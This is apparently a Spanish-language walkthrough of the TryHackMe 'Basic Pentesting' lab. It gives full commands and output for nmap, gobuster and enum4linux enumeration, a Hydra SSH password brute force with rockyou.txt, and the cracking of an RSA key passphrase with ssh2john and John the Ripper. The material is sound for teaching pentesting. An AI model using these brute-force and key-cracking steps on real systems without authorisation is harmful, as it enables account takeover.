---
title: 01. Basic Pentesting
daft: "false"
tags:
  - THM
  - EASY
cssclasses:
  - hbox
---
---
Created by: [@raf181_](https://github.com/raf181)  | Date: `18-11-2024`

---

Comenzamos realizando un escaneo general de la red. Para esto, ejecutamos un escaneo con **[nmap](https://www.kali.org/tools/nmap/)** utilizando la dirección IP proporcionada. Usamos el parámetro `-sV` para obtener información de las versiones y el parámetro `-sC` para información de scripts. Para acelerar el escaneo, también incluimos el parámetro `-T4`. Los resultados del escaneo se detallan a continuación.  

> [!abstract]- Como Instalar
> Instalar `Nmap`:
> ```bash
> sudo apt install nmap

```Bash
nmap -sV -sC -T4 $ip
```

> [!example]- Output
> ```Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 01:25 CET
> Stats: 0:01:03 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
> Service scan Timing: About 66.67% done; ETC: 01:27 (0:00:29 remaining)
> Nmap scan report for 10.10.63.0
> Host is up (0.13s latency).
> Not shown: 994 closed tcp ports (conn-refused)
> PORT     STATE SERVICE     VERSION
> 22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
> | ssh-hostkey:
> |   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
> |   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
> |_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
> 80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
> |_http-title: Site doesn't have a title (text/html).
> |_http-server-header: Apache/2.4.18 (Ubuntu)
> 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
> 445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
> 8009/tcp open  ajp13?
> |_ajp-methods: Failed to get a valid response for the OPTION request
> 8080/tcp open  http-proxy
> |_http-title: Apache Tomcat/9.0.7
> |_http-favicon: Apache Tomcat
> Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
>
> Host script results:
> |_clock-skew: mean: 1h40m14s, deviation: 2h53m13s, median: 14s
> | smb2-time:
> |   date: 2024-11-18T00:28:42
> |_  start_date: N/A
> | smb-security-mode:
> |   account_used: guest
> |   authentication_level: user
> |   challenge_response: supported
> |_  message_signing: disabled (dangerous, but default)
> | smb2-security-mode:
> |   3:1:1:
> |_    Message signing enabled but not required
> | smb-os-discovery:
> |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
> |   Computer name: basic2
> |   NetBIOS computer name: BASIC2\x00
> |   Domain name: \x00
> |   FQDN: basic2
> |_  System time: 2024-11-17T19:28:42-05:00
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 188.95 seconds```

De los resultados del escaneo, podemos observar que los puertos `22 (SSH)`, `80 (HTTP)` y los puertos `139–445 (SMB)` están abiertos. Al ingresar la dirección IP relevante en el navegador, no encontramos mucha información en la página web. Para recolectar más información, utilizamos una herramienta llamada **[gobuster](https://www.kali.org/tools/gobuster/)**. Con **[gobuster](https://www.kali.org/tools/gobuster/)**, podemos descubrir directorios dentro de la página web.  
> [!abstract]- Como Instalar
> Instalar `Gobuster`:
> ```bash
> sudo apt install gobuster
>```
> Descarga *`common directory list`* de v0re
> ```Bash
> wget https://raw.githubusercontent.com/v0re/dirb/refs/heads/master/wordlists/common.txt
> ```

```Bash
gobuster dir -u http://$ip/ -w /usr/share/wordlist/dirb/common.txt
```

> [!example]- Output
> ```
> ===============================================================
> Gobuster v3.6
> by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
> ===============================================================
> [+] Url:                     http://10.10.63.0/
> [+] Method:                  GET
> [+] Threads:                 10
> [+] Wordlist:                common.txt
> [+] Negative Status codes:   404
> [+] User Agent:              gobuster/3.6
> [+] Timeout:                 10s
> ===============================================================
> Starting gobuster in directory enumeration mode
> ===============================================================
> /.hta                 (Status: 403) [Size: 289]
> /.htaccess            (Status: 403) [Size: 294]
> /.htpasswd            (Status: 403) [Size: 294]
> /development          (Status: 301) [Size: 314] [--> http://10.10.63.0/development/]
> /index.html           (Status: 200) [Size: 158]
> /server-status        (Status: 403) [Size: 298]
> Progress: 4614 / 4615 (99.98%)
> ===============================================================
> Finished
> ===============================================================
> ```

A partir de los resultados del escaneo, descubrimos un directorio llamado `development`. Al visitar esta página, encontramos dos archivos llamados `dev.txt` y `j.txt`.  

![](99.%20Inserts/Pasted%20image%2020241118020931.png)

En el archivo `dev.txt`, vemos conversaciones entre `-J` y `-K`. De esto entendemos que están utilizando la versión `
`Apache version 2.5.12` en el sitio web.  

En el archivo `j.txt`, leemos que la contraseña de `-J` es débil. Esto nos da una pista para continuar.  

Para recopilar más información detallada del sistema SMB, utilizamos la herramienta **[enum4linux](https://www.kali.org/tools/enum4linux/)**. **[Enum4linux](https://www.kali.org/tools/enum4linux/)** es una herramienta diseñada para obtener información sobre sistemas SMB y Windows.  
> [!abstract]- Como Instalar
> Instalar `enum4linux`:
> ```bash
sudo apt install enum4linux
>

```Bash
enum4linux $ip
```

> [!example]- Output
> Important Output
> ![](99.%20Inserts/Pasted%20image%2020241118022657.png)
> ![](99.%20Inserts/Pasted%20image%2020241118022708.png)


Podemos observar en los resultados que los usuarios `-J` y `-K` son realmente Jan y Kay. Habíamos aprendido que la contraseña de Jan es débil. Para descifrar la contraseña, usaremos una herramienta llamada **[Hydra](https://www.kali.org/tools/hydra/)**. **[Hydra](https://www.kali.org/tools/hydra/)** es una herramienta ampliamente utilizada para descifrar contraseñas en sistemas de red.  

A partir de los resultados de Nmap, encontramos que el puerto SSH está abierto. Usando la herramienta **[Hydra](https://www.kali.org/tools/hydra/)**, intentaremos establecer una conexión a través del puerto SSH descifrando la contraseña.  
> [!abstract]- Como Instalar
> Instalar `wordlist`+`Hydra`:
>```Bash
>sudo apt install wordlists
>sudo apt install hydra
>```

```Bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 4
```

> [!example]- Output
> ```Bash
> Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service > organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
> 
> Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-18 15:46:59
> [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session > found, to prevent overwriting, ./hydra.restore
> [DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
> [DATA] attacking ssh://10.10.153.67:22/
> [STATUS] 24.00 tries/min, 24 tries in 00:01h, 14344375 to do in 9961:23h, 4 active
> [STATUS] 21.00 tries/min, 63 tries in 00:03h, 14344336 to do in 11384:24h, 4 active
> [STATUS] 24.14 tries/min, 169 tries in 00:07h, 14344230 to do in 9902:20h, 4 active
> [STATUS] 26.13 tries/min, 392 tries in 00:15h, 14344007 to do in 9147:58h, 4 active
> [22][ssh] host: 10.10.153.67   login: jan   password: ######
> 1 of 1 target successfully completed, 1 valid password found
> Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-18 16:16:28
> ```

Como resultado del uso de Hydra, obtenemos la contraseña de Jan. Con esta contraseña, establecemos una conexión SSH.  

### Escalación de privilegios  
Hemos iniciado sesión exitosamente como Jan. Tras explorar el sistema, encontramos que la bandera que buscamos está en el directorio del usuario Kay. Por lo tanto, necesitamos cambiar al usuario Kay. Para esto, debemos escalar privilegios. Podemos acceder a la clave RSA de Kay, la cual utilizaremos para escalar privilegios.  

Con la clave RSA, podemos acceder directamente a la cuenta de Kay a través de una conexión SSH sin ingresar una contraseña. Guardamos la clave RSA de Kay en un archivo llamado `a.txt` en nuestro terminal. Al intentar conectar con la cuenta de Kay usando la clave RSA, notamos que la clave RSA también está protegida con una frase de paso. Primero, necesitamos descifrar esta frase de paso. Para este propósito, podemos usar la herramienta **[ssh2john](https://www.kali.org/tools/john/#ssh2john)** de **[John the Ripper](https://www.kali.org/tools/john/#john)**.  

**[John the Ripper](https://www.kali.org/tools/john/#john)** es una herramienta comúnmente usada para descifrar contraseñas en sistemas basados en Unix. Inicialmente, la clave RSA, junto con **[ssh2john](https://www.kali.org/tools/john/#ssh2john)**, será transformada a un formato que **[John the Ripper](https://www.kali.org/tools/john/#john)** pueda descifrar. Guardamos la salida en un archivo de texto llamado `decrypted1.txt`. Luego, instruimos a **[John the Ripper](https://www.kali.org/tools/john/#john)** a intentar descifrar la frase de paso proporcionando el archivo de palabras comúnmente usado `rockyou.txt`.  

Después de una breve espera, podemos ver que la frase de paso ha sido descifrada. A continuación, escribimos el comando necesario, como se muestra, para establecer la conexión SSH desde el usuario Jan al usuario Kay. También proporcionamos la información de la frase de paso obtenida con la herramienta **[John the Ripper](https://www.kali.org/tools/john/#john)**, ¡y listo! Iniciamos sesión como el usuario Kay. Encontramos nuestra bandera dentro del archivo `pass.bak`.  

